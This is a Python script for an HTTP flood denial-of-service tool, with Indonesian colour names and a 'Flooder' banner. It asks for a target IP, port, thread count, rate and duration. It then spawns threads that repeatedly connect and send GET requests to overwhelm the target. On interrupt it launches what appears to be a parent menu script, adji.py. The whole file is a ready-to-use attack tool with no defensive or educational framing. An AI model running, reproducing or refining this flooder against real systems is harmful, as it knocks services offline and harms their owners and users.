import socket
import threading
import time
import os
from colorama import init, Fore, Style

init()

merah = Fore.RED
kuning = Fore.YELLOW
hijau = Fore.GREEN
biru = Fore.BLUE
hitam = Fore.BLACK
cyan = Fore.CYAN
ungu = Fore.MAGENTA
putih = Fore.WHITE
cerah = Style.BRIGHT

banner = f'''
{cerah}{kuning}─────────────────────────────────────────────                             
{cerah}{ungu} _____ _           _         
{cerah}{ungu}|   __| |___ ___ _| |___ ___ 
{cerah}{putih}|   __| | . | . | . | -_|  _|
{cerah}{putih}|__|  |_|___|___|___|___|_|
{cerah}{kuning}─────────────────────────────────────────────
{cerah}{cyan}Ctrl + C back to {cerah}{hijau}main menu
{cerah}{kuning}─────────────────────────────────────────────  
'''

def start_flood():
    try:
        target = input(f'{cerah}{biru}Enter IP Target>{putih} ')
        port = int(input(f'{cerah}{biru}Enter Port Target>{putih} '))
        threads = int(input(f'{cerah}{biru}Enter Number of Threads>{putih} '))
        attack_rate = int(input(f'{cerah}{biru}Enter Attack Rate (packets per second)>{putih} '))
        duration = int(input(f'{cerah}{biru}Enter Attack Duration (seconds)>{putih} '))
    except ValueError:
        print(f"{merah}Invalid input. Please enter numeric values for port, threads, attack rate, and duration.{putih}")
        return

    def flood():
        print(banner)
        start_time = time.time()
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target, port))
                sock.send(b'GET / HTTP/1.1\r\nHost: ' + target.encode() + b'\r\n\r\n')
                sock.close()
                time.sleep(1 / attack_rate)
                if time.time() - start_time > duration:
                    break
            except socket.error as e:
                print(f"{merah}Socket error: {e}{putih}")
                break
            except Exception as e:
                print(f"{merah}An error occurred: {e}{putih}")
                break

    try:
        threads_list = []
        for i in range(threads):
            thread = threading.Thread(target=flood)
            thread.start()
            threads_list.append(thread)
        
        for thread in threads_list:
            thread.join()
    except KeyboardInterrupt:
        print(f"\n{merah}Flood attack interrupted by user.{putih}")
        time.sleep(1)
        os.system('cd .. && python adji.py')

start_flood()
